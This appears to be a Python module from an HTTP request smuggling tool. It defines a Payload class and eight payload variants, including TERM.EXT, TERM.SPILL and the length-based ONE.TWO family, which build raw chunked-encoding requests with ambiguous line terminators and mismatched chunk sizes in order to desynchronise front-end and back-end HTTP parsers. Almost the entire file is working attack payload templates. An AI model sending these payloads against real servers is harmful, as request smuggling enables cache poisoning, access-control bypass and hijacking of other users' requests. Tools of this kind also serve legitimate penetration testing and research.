from abc import ABC, abstractmethod

def build_normal_req(host):
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

class Payload(ABC):
    def __init__(self, method="POST", host="localhost", path="/", headers=None):
        self.method = method
        self.host = host
        self.path = path or "/"  # in case an empty path was supplied
        self.headers = headers or []

    @staticmethod
    def get_all_payloads():
        return Payload.__subclasses__()

    @property
    @abstractmethod
    def pretty_name(self):
        pass

    @property
    @abstractmethod
    def ambiguous_line_terminators(self): 
        pass

    @property
    @abstractmethod
    def payload_templ(self):
        pass

    def get_pretty_name(self):
        return self.pretty_name

    def build(self, line_terminator="\n"):
        # construct a variant of the payload
        headers = "\r\n".join(self.headers) + "\r\n" if self.headers else ""
        return self.payload_templ.format(
            host=self.host,
            method=self.method,
            path=self.path,
            headers=headers,
            line_terminator=line_terminator
        )

    def build_all(self):
        # construct all variants of the payload
        return [(repr(lt), self.build(line_terminator=lt)) for lt in self.ambiguous_line_terminators]


class TERM_EXT(Payload):
    @property
    def pretty_name(self):
        return "TERM.EXT"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2;{line_terminator}"
            "XX\r\n"
            "10\r\n"
            "1f\r\n"
            "AAAABBBBCCCC\r\n"
            "0\r\n"
            "\r\n"
            "DDDDEEEEFFFF\r\n"
            "0\r\n"
            "\r\n"
        )


class EXT_TERM(Payload):
    @property
    def pretty_name(self):
        return "EXT.TERM"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2;{line_terminator}"
            "XX\r\n"
            "22\r\n"
            "c\r\n"
            "AAAABBBBCCCC\r\n"
            "0\r\n"
            "\r\n"
            "DDDDEEEEFFFF\r\n"
            "0\r\n"
            "\r\n"
        )


class TERM_SPILL(Payload):
    @property
    def pretty_name(self):
        return "TERM.SPILL"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "", "XX", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "5\r\n"
            "AAAAA{line_terminator}c\r\n"
            "17\r\n"
            "AAAABBBB\r\n"
            "0\r\n"
            "\r\n"
            "CCCCDDDD\r\n"
            "0\r\n"
            "\r\n"
        )


class SPILL_TERM(Payload):
    @property
    def pretty_name(self):
        return "SPILL.TERM"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r", "", "XX", "\rX", "\r\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "5\r\n"
            "AAAAA{line_terminator}1a\r\n"
            "8\r\n"
            "AAAABBBB\r\n"
            "0\r\n"
            "\r\n"
            "CCCCDDDD\r\n"
            "0\r\n"
            "\r\n"
        )


class ONE_TWO(Payload):
    @property
    def pretty_name(self):
        return "Length-based: ONE.TWO"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2\r\n"
            "XX{line_terminator}"
            "12\r\n"
            "XX\r\n"
            "19\r\n"
            "XXAAAABBBB\r\n"
            "0\r\n"
            "\r\n"
            "CCCCDDDD\r\n"
            "0\r\n"
            "\r\n"
        )


class TWO_ONE(Payload):
    @property
    def pretty_name(self):
        return "Length-based: TWO.ONE"

    @property
    def ambiguous_line_terminators(self):
        return ["\n", "\r"]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2\r\n"
            "XX{line_terminator}"
            "10\r\n"
            "\r\n"
            "AAAABBBBCCCCDD\r\n"
            "0\r\n"
            "\r\n"
        )


class ZERO_TWO(Payload):
    @property
    def pretty_name(self):
        return "Length-based: ZERO.TWO"

    @property
    def ambiguous_line_terminators(self):
        return [""]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2\r\n"
            "XX{line_terminator}"
            "012\r\n"
            "XX\r\n"
            "19\r\n"
            "XXAAAABBBB\r\n"
            "0\r\n"
            "\r\n"
            "CCCCDDDD\r\n"
            "0\r\n"
            "\r\n"
        )


class TWO_ZERO(Payload):
    @property
    def pretty_name(self):
        return "Length-based: TWO.ZERO"

    @property
    def ambiguous_line_terminators(self):
        return [""]

    @property
    def payload_templ(self):
        return (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "{headers}"
            "\r\n"
            "2\r\n"
            "xx{line_terminator}"
            "010\r\n"
            "\r\n"
            "AAAABBBBCCCCDD\r\n"
            "0\r\n"
            "\r\n"
        )

